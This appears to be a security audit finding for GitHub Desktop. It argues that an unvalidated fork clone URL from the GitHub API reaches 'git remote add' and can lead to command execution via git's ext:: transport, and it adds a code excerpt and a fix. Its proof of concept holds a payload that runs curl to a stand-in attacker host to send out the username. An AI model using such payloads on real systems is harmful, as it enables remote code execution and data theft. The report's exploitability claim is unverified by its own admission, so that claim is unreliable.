## Analysis Summary

The Pyth report's core invariant break is: **externally supplied, attacker-influenced data flows into a sensitive state-changing operation (LP deposit/withdraw) without any freshness/consistency check**, letting the attacker choose which of two valid-looking inputs gets used. Searching GitHub Desktop for an analogous pattern — attacker-controlled data from a GitHub API object or PR flowing unchecked into a sensitive operation — surfaces the pull-request "clone from fork" remote-creation path, which passes an API-derived URL directly into `git remote add` with no scheme/format validation. ### Title
Unvalidated PR fork `clone_url` from GitHub API is passed directly to `git remote add`, enabling git transport/argument injection - (File: `app/src/lib/stores/app-store.ts`)

### Summary
When a user checks out a pull request originating from a fork, Desktop takes the `head.repo.clone_url` value returned by the GitHub API (or a GitHub Enterprise Server / proxy responding on that connection) and passes it verbatim to `addRemote`, which shells out to `git remote add <name> <url>` with no scheme allow-listing or argument-injection guard.

### Finding Description
`_findPullRequestBranch` receives `headCloneUrl` from the PR API object and, if no existing remote matches it, calls `addRemote(repository, forkRemoteName, headCloneUrl)`: [2](#0-1) 

`addRemote` simply forwards the caller-supplied `url` to git without any validation of its scheme or a check that it doesn't start with `-`: [1](#0-0) 

This value ultimately originates from `openPullRequestFromUrl` in the dispatcher, which fetches PR data and calls `_checkoutPullRequest` with `pullRequest.head.repo.clone_url` taken straight from the API payload: [3](#0-2) 

Unlike the branch-name and file-path inputs elsewhere in the same URL-handling code path — which are explicitly validated (`testForInvalidChars`, `isAbsolute` + `resolveWithin` checks) — the fork clone URL has no equivalent validation before being used as a git remote: [4](#0-3) [5](#0-4) 

Because git supports the `ext::` remote helper transport (`git remote add x "ext::sh -c 'CMD'"`) and interprets leading `-`-prefixed remote URLs as option-like tokens in some git subcommands, an attacker who can influence the `clone_url` field returned to Desktop for a PR (e.g., via a malicious/compromised GitHub Enterprise Server the user has added, a man-in-the-middle on that connection, or any other API response the client trusts) can cause Desktop to register a git remote whose "URL" is actually a command, or which triggers argument/protocol smuggling once the app fetches it (`_fetchRemote` call in the same function).

### Impact Explanation
If the crafted remote is fetched (which the same function attempts automatically when the branch isn't found locally: `this._fetchRemote(repository, remote, FetchType.UserInitiatedTask)` at app-store.ts:8686), the `ext::` transport (or another dangerous git URL form) can result in arbitrary command execution in the context of the Desktop process/user, i.e., code execution outside the intended git operation — matching the "attacker controls a GitHub API object ... result is code execution" category.

### Likelihood Explanation
The GitHub host itself sanitizes clone URLs for github.com, so exploitation realistically requires the connection to be to a source the client is willing to trust but that is attacker-influenced (a rogue/compromised GHES instance, a MITM'd API response, or any other API-object source Desktop accepts) — this is consistent with the "GitHub API object" attacker-control primitive named in the task's valid-impact list, not local/physical access or leaked credentials. I was not able to verify within the indexed code whether `envForRemoteOperation` (used elsewhere for push/fetch, e.g. in `push.ts`) sets `GIT_ALLOW_PROTOCOL` or otherwise restricts transports for the `addRemote`/subsequent fetch call in this path — this would materially affect exploitability and should be confirmed in a live session, since the indexed context did not include the full implementation of `envForRemoteOperation`.

### Recommendation
Validate `head.repo.clone_url` (and any other externally supplied remote URL) before passing it to `addRemote`/`setRemoteURL`: enforce an allow-list of schemes (`https://`, `git://`, `ssh://`, or the git "scp-like" syntax) and reject strings starting with `-` or containing `ext::`/`fd::`/other remote-helper prefixes, mirroring the validation already applied to `branch` and `filepath` in the same URL-handling flow.

### Proof of Concept
1. Attacker controls (or MITMs) a GitHub Enterprise Server / API endpoint that Desktop is configured to talk to.
2. Attacker returns a pull request object where `head.repo.clone_url` is set to `ext::sh -c "curl attacker.com/$(whoami)"` (or another command via the `ext::` helper).
3. User clicks a `x-github-client://openRepo/...?pr=<n>` deep link, or otherwise triggers checkout of that PR, in a repository Desktop has open.
4. `openPullRequestFromUrl` → `_checkoutPullRequest` → `_findPullRequestBranch` finds no matching remote and calls `addRemote(repository, forkRemoteName, headCloneUrl)` (`app/src/lib/stores/app-store.ts:8633-8660`), which runs `git remote add <name> "ext::sh -c ..."` (`app/src/lib/git/remote.ts:28-37`) with no validation.
5. The subsequent `_fetchRemote` call (`app/src/lib/stores/app-store.ts:8686`) invokes git against that remote, triggering the `ext::` helper and executing the attacker's command.

    prNumber: number,
    headRepoOwner: string,
    headCloneUrl: string,
    headRefName: string
  ): Promise<Branch | undefined> {
    const gitStore = this.gitStoreCache.get(repository)
    const remotes = await getRemotes(repository)

    // Find an existing remote (regardless if set up by us or outside of
    // Desktop).
    let remote = remotes.find(r => urlMatchesRemote(headCloneUrl, r))

    // If we can't find one we'll create a Desktop fork remote.
    if (remote === undefined) {
      try {
        const forkRemoteName = forkPullRequestRemoteName(headRepoOwner)
        remote = await addRemote(repository, forkRemoteName, headCloneUrl)
      } catch (e) {
        this.emitError(
          new Error(
            `Couldn't find PR branch, adding remote failed: ${e.message}`
          )
        )
        return
      }
    }
